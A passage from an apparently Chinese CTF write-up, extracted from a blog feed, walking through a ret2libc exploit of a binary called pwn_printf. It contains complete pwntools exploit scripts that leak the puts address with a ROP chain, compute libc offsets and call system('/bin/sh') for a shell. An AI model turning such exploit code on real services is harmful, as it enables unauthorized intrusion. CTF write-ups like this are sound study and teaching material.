-<p><img src="https://img-blog.csdnimg.cn/20201108200522719.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1lhbmdaaVRyaWNr,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
-<p>16次循环<br>下面if判断v12&lt;=0x20<br>所以写</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">	n.sendline(<span class="string">&quot;32&quot;</span>)</span><br></pre></td></tr></table></figure>
-
-<p>跟进if下面的函数</p>
-<p><img src="https://img-blog.csdnimg.cn/20201108200913518.png#pic_center" alt="在这里插入图片描述"></p>
-<p>这里变量的栈是空栈0h，所以offset只需要64bit程序的8个就行。<br>再然后a * a1，所以传参需要double 0x20，也就是0x40<br><code>ROPgadget --binary pwn_printf</code><br>找到pop_rdi_ret的地址<br>复习一下libc64_payload公式</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">64</span>位payload: payload = <span class="string">&quot;a&quot;</span>*offset + p64(pop_rdi) + p64(got) + p64(plt) + p64(ret_addr/main)</span><br></pre></td></tr></table></figure>
-
-
-<p>写exp：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh = process(<span class="string">&#x27;./pwn_printf&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn_printf&#x27;</span>)</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">pop_rdi = <span class="number">0x401213</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">	n.sendline(<span class="string">&quot;32&quot;</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">8</span> + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(pop_rdi) + p64(<span class="number">0x40</span>) + p64(<span class="number">0x4007C6</span>)</span><br><span class="line">sh.send(payload)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;You will find this game very interesting\n&#x27;</span>)</span><br><span class="line">puts_addr = u64(sh.recvn(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_addr))</span><br></pre></td></tr></table></figure>
-
-<p>这就print出来了puts的地址</p>
-<p><img src="https://img-blog.csdnimg.cn/20201108201921266.png#pic_center" alt="在这里插入图片描述"></p>
-<p>到<a href="https://libc.blukat.me/">libc database search</a>查一下相关libc信息</p>
-<p>在套用一下公式</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">libc_base = puts_addr - <span class="number">0x080a30</span>    <span class="comment"># -libc_Offset的puts</span></span><br><span class="line"></span><br><span class="line">system_addr = libc_base + <span class="number">0x04f4e0</span>   <span class="comment"># +libc_Offset的system</span></span><br><span class="line"></span><br><span class="line">bin_sh_addr = libc_base + <span class="number">0x1b40fa</span>		<span class="comment"># +libc_Offset的bin/sh</span></span><br></pre></td></tr></table></figure>
-
-<p>复习一下libc64_getshell公式</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">getshell: <span class="string">&quot;a&quot;</span>*offset + p64(ret) + p64(pop_rdi) + p64(str_bin_sh) + p64(system_addr)</span><br></pre></td></tr></table></figure>
-
-<p>完整exp：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh = process(<span class="string">&#x27;./pwn_printf&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn_printf&#x27;</span>)</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">pop_rdi = <span class="number">0x401213</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">	sh.sendline(<span class="string">&quot;32&quot;</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">8</span> + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(pop_rdi) + p64(<span class="number">0x40</span>) + p64(<span class="number">0x4007C6</span>)</span><br><span class="line">sh.send(payload)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;You will find this game very interesting\n&#x27;</span>)</span><br><span class="line">puts_addr = u64(sh.recvn(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_addr))</span><br><span class="line">libc_base = puts_addr - <span class="number">0x080a30</span> <span class="comment">#0x6f6a0</span></span><br><span class="line">system_addr = libc_base + <span class="number">0x04f4e0</span> <span class="comment">#0x0453a0</span></span><br><span class="line">bin_sh_addr = libc_base + <span class="number">0x1b40fa</span> <span class="comment">#0x18ce17 </span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">8</span> + p64(<span class="number">0x4007C6</span>) + p64(pop_rdi) + p64(bin_sh_addr) + p64(system_addr)</span><br><span class="line"></span><br><span class="line">sh.send(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
 ]]></content>
       <categories>
         <category>比赛WriteUp</category>
